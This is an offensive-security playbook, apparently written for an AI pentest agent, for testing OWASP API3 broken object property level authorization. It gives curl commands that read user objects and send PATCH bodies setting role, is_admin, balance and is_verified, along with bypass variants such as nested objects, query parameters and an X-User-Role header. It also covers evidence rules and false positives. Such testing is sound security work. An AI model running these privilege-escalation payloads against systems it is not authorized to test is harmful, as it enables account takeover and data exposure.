---
name: api-bopla
description: Broken Object Property Level Authorization testing covering unauthorized property reads (excessive data exposure) and writes (mass assignment) with differential evidence
intent: offensive
---

# API BOPLA — Broken Object Property Level Authorization (OWASP API3)

## Purpose
Test whether API responses expose restricted properties to unauthorized callers (READ) and whether unauthorized callers can modify properties they should not control (WRITE/mass assignment).

## Preconditions
- At least one valid account/session (for differential testing)
- Known API endpoints that return or accept object properties
- The authz_matrix tool available for cross-role comparison

## Attack Surface Signals
- API responses containing fields beyond what the UI displays
- Endpoints that accept JSON/XML bodies with multiple properties
- PATCH/PUT endpoints that update object fields
- OpenAPI specs listing restricted fields
- Different response shapes for different roles

## Methodology

### Unauthorized Property READ (Excessive Data Exposure)

Establish what the caller SHOULD see, then verify what they ACTUALLY receive:

```bash
# 1. Get the legitimate response for the lowest-privilege caller
curl -sk -H "Authorization: Bearer USER_TOKEN" "https://TARGET/api/users/me" | jq . > tmp/user_response.json

# 2. Check for restricted properties in the response
# Look for: role, isAdmin, internalId, permissions, balance, tenantId,
# is_verified, price_override, created_by, deleted_at, api_key, password_hash
jq 'keys' tmp/user_response.json

# 3. Compare against the same endpoint as a higher-privilege caller
# (if available) or against the UI display
curl -sk -H "Authorization: Bearer ADMIN_TOKEN" "https://TARGET/api/users/me" | jq . > tmp/admin_response.json
diff <(jq -S 'keys' tmp/user_response.json) <(jq -S 'keys' tmp/admin_response.json)
```

**IMPORTANT**: Field NAMES alone are not evidence. Verify the VALUE is:
- Genuinely sensitive (PII, credentials, internal flags, financial data)
- Not accessible to the caller through any intended UI
- Returned in a context where the caller should not see it

### Unauthorized Property WRITE (Mass Assignment)

Test whether restricted properties can be set via the API:

```bash
# 1. Establish the baseline object state
curl -sk -H "Authorization: Bearer USER_TOKEN" "https://TARGET/api/users/me" | jq . > tmp/before.json

# 2. Attempt to set a restricted property
curl -sk -X PATCH "https://TARGET/api/users/me" \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"balance":99999,"is_verified":true}' \
  | jq .

# 3. Verify the change actually persisted (READ-BACK)
curl -sk -H "Authorization: Bearer USER_TOKEN" "https://TARGET/api/users/me" | jq . > tmp/after.json
diff <(jq -S . tmp/before.json) <(jq -S . tmp/after.json)
```

**Verification is mandatory**: a 200 response does NOT prove the write happened. Read back and diff.

### Cross-Role Property Access

Use authz_matrix for automated differential testing:
```
authz_matrix(endpoint="/api/users/me", roleA="USER_TOKEN", roleB="ADMIN_TOKEN")
```

## Evidence Contract

A BOPLA finding requires ALL of:
1. Baseline: legitimate low-privilege request establishes normal state
2. Manipulation: same request with restricted property present
3. Differential: the restricted property's value CHANGED (write) or was RETURNED when it should not have been (read)
4. The value is genuinely restricted — not ordinary metadata

**NOT evidence**: field named "internal_id" exists, response has more fields than the UI, HTTP 200 on a PATCH

## Common Misses
- Nested objects: `{"user": {"role": "admin"}}` in a PATCH body
- Query parameter mass assignment: `?role=admin`
- Headers as property sources: `X-User-Role: admin`
- Batching: multiple objects in one request
- Partial response masks: `?fields=role,isAdmin`

## False Positives / Non-Findings
- Public metadata (creation date, public UUID) is not sensitive by default
- A field existing in the API but not in the current UI version may be planned feature
- Debug fields in staging environments that don't exist in production
- The API returning the user's OWN settings (which they can legitimately see)

## Xalgorix Tool Strategy
- `authz_matrix` for automated cross-role property differential
- `terminal_execute` with curl for precise property manipulation
- Python for batch property enumeration across all discovered fields

## Stopping Rule
Exhaust every discovered property on every endpoint accessible to the tested role. Test both read and write paths.

## Handoff
Report each confirmed unauthorized property access with: endpoint, property name, expected access level, actual behavior, and the concrete value that was exposed or persisted.
